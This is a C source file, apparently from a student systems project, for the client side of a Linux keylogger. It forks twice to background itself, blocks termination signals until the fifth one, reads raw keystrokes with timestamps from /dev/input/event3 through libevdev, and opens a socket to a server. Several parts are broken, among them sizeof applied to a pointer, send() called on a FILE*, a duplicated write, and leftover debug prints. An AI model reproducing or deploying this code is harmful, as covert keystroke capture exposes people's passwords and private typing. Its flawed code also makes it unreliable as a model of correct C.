#include "client.h"

#include <errno.h>
#include <libevdev/libevdev.h>
#include <netinet/in.h>  // sockaddr_in
#include <pthread.h>
#include <signal.h>
#include <stdio.h>  // getline, free
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>  // connect, sockaddr
#include <sys/stat.h>
#include <unistd.h>

#include "keylogger.h"
#include "server_utils.h"

// Signal counter needs to be a global variable so that it is accessible
// by the signal handler function. It cannot be constant
//  NOLINTNEXTLINE
int signal_counter = 0;

void background_process(void) {
  // All exits are not linted just like they are in the softsys assignments

  // process line
  // lwitten     5523  0.0  0.0   2772    96 ?        S    17:05   0:00
  // ./src/main

  // instructions for killing the program from command line
  // sudo kill -SIGNAL_CODE P_ID
  //-9 for kill, -2 for int
  // sudo kill -9 -- -GROUPID

  printf("Begin Backgrounding 1.\n");

  int process_id = fork();

  if (process_id == -1) {
    perror("Failed to fork Process.\n");
    // printf("failed to fork 1\n");
    // status 1 is an error
    //  NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(errno);
  } else if (process_id > 0) {
    // successfully exit parent process

    printf("Parent exiting.\n");
    // NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(0);
  }

  // redirect signals
  immortalize();

  // fork again?
  // printf("backgrounding complete 5\n");
  process_id = fork();

  if (process_id == -1) {
    perror("Failed to fork Process.\n");
    // status 1 is an error
    //  NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(errno);
  } else if (process_id > 0) {
    // successfully exit parent process
    printf("Killing parent.");
    // raise(SIGKILL);
    //  NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(0);
    // this is intentional error checking code and should remain althought
    // unreachable
    //  NOLINTNEXTLINE(clang-diagnostic-unreachable-code)
    perror("This should not be viewable.");
  }
  // change working directory to root

  // Not linted as successful forking is checked and so will remain safe
  // and only accessible by one process
  //  NOLINTNEXTLINE(concurrency-mt-unsafe)
  char* path = getenv("HOME");

  if (path != NULL) {
    (void)chdir(path);
  }

  // set umask to 0
  umask(0);
  // signal handle again for the new process
  immortalize();
  // NOLINTNEXTLINE(concurrency-mt-unsafe)
  // printf("backgrounding complete\n");
}

void immortalize(void) {
  // Redirect common abort/termination/interrupt signals to ignores

  // Redirect common abort/termination/interrupt signals to ignores

  // int* signal_counter  = malloc(sizeof(int));
  (void)signal(SIGINT, shutdown_signal);
  (void)signal(SIGTERM, shutdown_signal);
  (void)signal(SIGHUP, shutdown_signal);
  (void)signal(SIGABRT, shutdown_signal);
}

// signal handling function
// not linting the next line as Clang dislikes that signal is not used,
// but an integer argument is required for signal handling functions

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"
// NOLINTNEXTLINE
void shutdown_signal(int signal) {
#pragma GCC diagnostic pop
  // global variable signal_counter defined above

  // on 5th actually shutdown
  if (signal_counter > 4) {
    // Not linting this line as it should be asynchronous safe since
    // raising SIGKILL should only be able to be called once

    // NOLINTNEXTLINE(bugprone-signal-handler,cert-sig30-c)
    printf("Ending Program");
    (void)raise(SIGKILL);
    printf("Error Killing Program.");
  }
  signal_counter++;
  printf("Shutdown Signal Blocked.");
}

void try_connect(int client_socket, struct sockaddr_in server_addr) {
  if (connect(client_socket, (struct sockaddr*)&server_addr,
              sizeof(server_addr)) < 0) {
    error_and_exit("Error connecting to server.");
  }
  printf("CLIENT CONNECTED\n");
}

FILE* get_socket_file(int client_socket) {
  FILE* socket_file = fdopen(client_socket, "w+");
  if (socket_file == NULL) {
    error_and_exit("Couldn't open socket as file stream.");
  }
  return socket_file;
}

int send_data(FILE* socket_file) {
  char* send_line = NULL;
  size_t send_line_size = 0;
  if (getline(&send_line, &send_line_size, stdin) == -1) {
    return -1;
  }
  // If we can't send the line on the socket, the connection is broken and we
  // have to exit. (
  printf("%s \n", send_line);
  puts("Client sent line.");
  // printf("%i\n", fileno(socket_file));

  printf("1\n");
  printf("send line: %s\n", send_line);
  printf("send line: %p\n", socket_file);

  fputs(send_line, socket_file);
  printf("fuck off\n");

  if (fputs(send_line, socket_file) == EOF) {
    printf("2\n");
    free(send_line);
    error_and_exit("Couldn't send line.");
  }
  printf("3\n");

  free(send_line);
  char* recv_line = NULL;
  size_t recv_line_size = 0;
  if (getline(&recv_line, &recv_line_size, socket_file) == -1) {
    return 0;
  }
  free(recv_line);
  return 0;
}

int serialize(FILE* socket_file, key_package* packet) {
  // Allocate memory for the serialized data
  size_t packet_size = sizeof(packet);
  char* serialized_data = malloc(packet_size);

  // Copy the struct into the serialized data buffer
  memcpy(serialized_data, packet, packet_size);
  // memcpy_s is causing multiple library issues with libc even when string.h is
  // linked.

  // Send the serialized data over the socket
  int bytes_sent = send(socket_file, serialized_data, packet_size, 0);

  // Free the serialized data memory
  free(serialized_data);

  return bytes_sent;
}

void log_keys(key_package* package) {
  // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html
  int timer_counter = 20000000;

  // open a device, as libevdev expects a file descriptor. You should have root
  // permissions
  struct libevdev* keyboard_dev;
  int rc;

  // get keyboard inputs event file
  int keyboard_fd = open("/dev/input/event3", O_RDONLY | O_NONBLOCK);
  if (keyboard_fd < 0) {
    fprintf(stderr, "Error opening event3 file: %d %s\n", errno,
            strerror(errno));
    exit(0);
  }
  rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
  if (rc < 0) {
    fprintf(stderr, "Error with setting rc: %d %s\n", -rc, strerror(-rc));
    exit(0);
  }

  int counter = 0;

  while (1) {
    ++counter;
    struct input_event ev;

    // other options: LIBEVDEV_READ_FLAG_NORMAL
    rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
    if (rc < 0) {
      // note that this section runs when no event is occurring, NOT necessarily
      // when there is an error printf("value of rc: %d\n", rc);
      if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
    } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
      // handle event here

      // each key press/lift generates 3 events: EV_MSC, EV_SYN, and EV_KEY
      // we only care about EV_KEY, represented by ev.type == 1
      if (ev.type == 1) {
        if (ev.value == 1 || ev.value == 2) {
          // get current time
          time_t rawtime;
          struct tm* timeinfo;
          time(&rawtime);
          timeinfo = localtime(&rawtime);

          // make key struct, add to key package. do the file writing in another
          // file
          key_info pressed_key = {
              .key = libevdev_event_code_get_name(ev.type, ev.code),
              .timestamp = asctime(timeinfo)};

          // append to key_package->keys
          package->keys[package->keys_arr_size] = pressed_key;
          package->keys_arr_size++;

          // printf("New key_package array size: %ld\n",
          // key_package->keys_arr_size);
        }
      }
    } else {
      printf("Unsure of what is going on here..\n");
    }

    if (counter == timer_counter) {
      counter = 0;
      // read and write and whee

      print_logged_keys(*package);
      if (package->keys_arr_size != 0) {
        reset_structs(package);
      }
    }

    if (ev.code == 107) {
      // if (log_indicator == 0) {
      printf("\nExiting.\n");

      break;
    }
  }

  // Clean up
  libevdev_free(keyboard_dev);
  close(keyboard_fd);
}
